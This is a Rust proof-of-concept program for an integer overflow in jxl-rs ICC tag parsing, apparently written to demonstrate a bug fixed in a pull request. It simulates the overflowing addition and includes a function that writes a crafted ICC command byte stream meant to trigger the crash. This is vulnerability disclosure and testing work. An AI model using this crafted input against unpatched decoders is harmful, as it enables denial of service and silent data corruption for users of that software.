// POC: ICC Integer Overflow DoS in jxl-rs
// Demonstrates vulnerability fixed in PR #602
//
// Usage:
//   cargo run              - Shows the crash
//   cargo run -- --create  - Creates malicious_icc_commands.bin
//   cargo run -- --wrap    - Shows silent corruption (wrapping mode)

use std::env;
use std::fs::File;
use std::io::Write;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() > 1 && args[1] == "--create" {
        create_malicious_icc_stream();
        return;
    }

    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║  POC: ICC Integer Overflow DoS (jxl-rs PR #602)              ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    // Simulate values from malicious JXL ICC stream
    // In real attack, these come from parsing ICC command stream in tag.rs
    let prev_tagstart: u32 = 0x0000_008C; // Normal: ICC_HEADER_SIZE + 12
    let prev_tagsize: u32 = 0xFFFF_FF80;  // Malicious: crafted to cause overflow

    println!("Vulnerable code in jxl/src/icc/tag.rs line 53-54:");
    println!("  let tagstart = prev_tagstart + prev_tagsize;");
    println!();
    println!("Attack values (from crafted ICC command stream):");
    println!("  prev_tagstart: 0x{:08X} ({} bytes)", prev_tagstart, prev_tagstart);
    println!("  prev_tagsize:  0x{:08X} ({} bytes)", prev_tagsize, prev_tagsize);
    println!();
    println!("Expected result: 0x{:X} ({} bytes)",
        prev_tagstart as u64 + prev_tagsize as u64,
        prev_tagstart as u64 + prev_tagsize as u64);
    println!();

    if args.len() > 1 && args[1] == "--wrap" {
        // Simulate release mode with wrapping
        let tagstart = prev_tagstart.wrapping_add(prev_tagsize);
        println!("Wrapping mode (release builds): 0x{:08X}", tagstart);
        println!("⚠️  Tag now points to offset {} - INSIDE ICC HEADER!", tagstart);
        println!("   This corrupts data silently!");
    } else {
        println!("Debug mode - executing vulnerable addition...");
        println!();

        // This panics in debug builds!
        let tagstart = prev_tagstart + prev_tagsize;

        // Never reached
        println!("Result: 0x{:08X}", tagstart);
    }
}

/// Creates a binary file representing the malicious ICC command stream structure
fn create_malicious_icc_stream() {
    println!("Creating malicious_icc_commands.bin...\n");

    // JXL ICC command stream format (simplified):
    // - Command byte: bits 0-5 = tagcode, bit 6 = explicit tagstart, bit 7 = explicit tagsize
    // - If bit 7 set: tagsize follows as varint
    // - If bit 6 NOT set: tagstart = prev_tagstart + prev_tagsize (VULNERABLE!)

    let mut commands = Vec::new();

    // Tag 1: Set up large prev_tagsize
    // Command: tagcode=2 (rTRC), bit6=0, bit7=1 (read tagsize from varint)
    commands.push(0x82u8);

    // Varint encoding of 0xFFFFFF80 (large tagsize to cause overflow)
    // Varint: 7 bits per byte, high bit = continuation
    // 0xFFFFFF80 = 4294967168
    // Binary: 11111111 11111111 11111111 10000000
    // Varint bytes (LSB first, 7 bits each):
    commands.extend_from_slice(&[
        0x80, // 0000000 + continuation
        0xFF, // 1111111 + continuation
        0xFF, // 1111111 + continuation
        0xFF, // 1111111 + continuation
        0x0F, // 0001111 (no continuation)
    ]);

    // Tag 2: Trigger the overflow!
    // Command: tagcode=3 (rXYZ), bit6=0 (compute tagstart = prev_tagstart + prev_tagsize)
    // This line executes: tagstart = 0x8C + 0xFFFFFF80 = OVERFLOW!
    commands.push(0x03u8);

    // End marker
    commands.push(0x00u8);

    let mut file = File::create("malicious_icc_commands.bin").unwrap();
    file.write_all(&commands).unwrap();

    println!("Created malicious_icc_commands.bin ({} bytes)", commands.len());
    println!();
    println!("Hex: {:02X?}", commands);
    println!();
    println!("Command stream structure:");
    println!("  [0x82]           - Tag 1: rTRC with explicit tagsize");
    println!("  [80 FF FF FF 0F] - Varint: 0xFFFFFF80 (large tagsize)");
    println!("  [0x03]           - Tag 2: rXYZ, compute tagstart from prev");
    println!("  [0x00]           - End marker");
    println!();
    println!("When jxl-rs parses Tag 2:");
    println!("  tagstart = prev_tagstart + prev_tagsize");
    println!("  tagstart = 0x8C + 0xFFFFFF80");
    println!("  tagstart = 0x10000000C  →  OVERFLOW  →  0x0000000C");
    println!();
    println!("NOTE: This is the raw ICC command stream. In a real JXL file,");
    println!("      this would be entropy-coded within the ICC box.");
}
